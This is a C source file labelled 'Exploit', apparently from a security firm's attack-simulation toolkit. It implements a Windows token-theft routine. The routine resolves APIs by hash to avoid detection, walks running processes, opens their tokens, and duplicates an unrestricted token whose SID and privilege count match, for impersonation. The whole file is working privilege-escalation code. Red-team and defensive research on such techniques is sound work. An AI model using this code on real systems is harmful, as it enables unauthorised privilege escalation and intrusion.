/*!
 *
 * Exploit
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
!*/

#include "Common.h"

typedef struct
{
	D_API( NtQueryInformationToken );
	D_API( ConvertStringSidToSidA );
	D_API( RtlInitUnicodeString );
	D_API( NtOpenProcessToken );
	D_API( IsTokenRestricted );
	D_API( NtGetNextProcess );
	D_API( DuplicateTokenEx );
	D_API( LdrUnloadDll );
	D_API( RtlEqualSid );
	D_API( LdrLoadDll );
	D_API( LocalAlloc );
	D_API( LocalFree );
	D_API( NtClose );
} API ;

#define H_API_NTQUERYINFORMATIONTOKEN	0x0f371fe4 /* NtQueryInformationToken */
#define H_API_CONVERTSTRINGSIDTOSIDA	0x0d370be1 /* ConvertStringSidToSidA */
#define H_API_RTLINITUNICODESTRING	0xef52b589 /* RtlInitUnicodeString */
#define H_API_NTOPENPROCESSTOKEN	0x350dca99 /* NtOpenProcessToken */
#define H_API_ISTOKENRESTRICTED		0x8e8025fb /* IsTokenRestricted */
#define H_API_NTGETNEXTPROCESS		0x0963c3a5 /* NtGetNextProcess */
#define H_API_DUPLICATETOKENEX		0x10ad057e /* DuplicateTokenEx */
#define H_API_LDRUNLOADDLL		0xd995c1e6 /* LdrUnloadDll */
#define H_API_RTLEQUALSID		0x5f7a694f /* RtlEqualSid */
#define H_API_LDRLOADDLL		0x9e456a43 /* LdrLoadDll */
#define H_API_LOCALALLOC		0x72073b5b /* LocalAlloc */
#define H_API_LOCALFREE			0x32030e92 /* LocalFree */
#define H_API_NTCLOSE			0x40d6e69d /* NtClose */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Searches for a token matching the specified
 * SID and privilege count.
 *
!*/

D_SEC( C ) HANDLE TokenGetTokenWithSidAndPrivilegeCount( _In_ LPSTR SidString, _In_ ULONG PrivCount )
{
	API			Api;
	UNICODE_STRING		Uni;
	TOKEN_STATISTICS	Tst;

	ULONG			Len = 0;

	PSID			Sid = NULL;
	HANDLE			Prc = NULL;
	HANDLE			Nxt = NULL;
	HANDLE			Tok = NULL;
	HANDLE			Dup = NULL;
	HMODULE			Adv = NULL;
	HMODULE			K32 = NULL;
	PTOKEN_USER		Usr = NULL;

	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
	RtlSecureZeroMemory( &Tst, sizeof( Tst ) );

	Api.NtQueryInformationToken = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUERYINFORMATIONTOKEN );
	Api.RtlInitUnicodeString    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITUNICODESTRING );
	Api.NtOpenProcessToken      = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTOPENPROCESSTOKEN );
	Api.NtGetNextProcess        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTGETNEXTPROCESS );
	Api.LdrUnloadDll            = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRUNLOADDLL );
	Api.RtlEqualSid             = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLEQUALSID );
	Api.LdrLoadDll              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRLOADDLL );
	Api.NtClose                 = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );

	Api.RtlInitUnicodeString( &Uni, C_PTR( G_PTR( L"kernel32.dll" ) ) );
	Api.LdrLoadDll( NULL, 0, &Uni, &K32 );

	Api.RtlInitUnicodeString( &Uni, C_PTR( G_PTR( L"advapi32.dll" ) ) );
	Api.LdrLoadDll( NULL, 0, &Uni, &Adv );

	if ( Adv != NULL && K32 != NULL ) {
		Api.ConvertStringSidToSidA = PeGetFuncEat( Adv, H_API_CONVERTSTRINGSIDTOSIDA );
		Api.IsTokenRestricted      = PeGetFuncEat( Adv, H_API_ISTOKENRESTRICTED );
		Api.DuplicateTokenEx       = PeGetFuncEat( Adv, H_API_DUPLICATETOKENEX );
		Api.LocalAlloc             = PeGetFuncEat( K32, H_API_LOCALALLOC );
		Api.LocalFree              = PeGetFuncEat( K32, H_API_LOCALFREE );

		while ( NT_SUCCESS( Api.NtGetNextProcess( Prc, PROCESS_QUERY_INFORMATION, 0, 0, &Nxt ) ) ) {
			if ( Prc != NULL ) {
				Api.NtClose( Prc );
			}; Prc = Nxt;

			if ( NT_SUCCESS( Api.NtOpenProcessToken( Prc, TOKEN_QUERY | TOKEN_DUPLICATE, &Tok ) ) ) {
				if ( ! NT_SUCCESS( Api.NtQueryInformationToken( Tok, TokenUser, NULL, 0, &Len ) ) ) {
					if ( ( Usr = Api.LocalAlloc( LPTR, Len ) ) ) {
						if ( NT_SUCCESS( Api.NtQueryInformationToken( Tok, TokenUser, Usr, Len, &Len ) ) ) {
							if ( Api.ConvertStringSidToSidA( SidString, &Sid ) ) {
								if ( Api.RtlEqualSid( Sid, Usr->User.Sid ) ) {
									if ( NT_SUCCESS( Api.NtQueryInformationToken( Tok, TokenStatistics, &Tst, sizeof( Tst ), &Len ) ) ) {
										if ( Tst.PrivilegeCount >= PrivCount ) {
											if ( ! Api.IsTokenRestricted( Tok ) ) {
												Api.DuplicateTokenEx( Tok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &Dup );
											};
										};
									};
								};
								Api.LocalFree( Sid );
							};
						};
						Api.LocalFree( Usr );
					};
				};
				Api.NtClose( Tok );
			};
			if ( Dup != NULL ) {
				break;
			};
		};
	};
	if ( Prc != NULL ) {
		Api.NtClose( Prc );
	};
	if ( Adv != NULL ) {
		Api.LdrUnloadDll( Adv );
	};
	if ( K32 != NULL ) {
		Api.LdrUnloadDll( K32 );
	};
	return Dup;
};
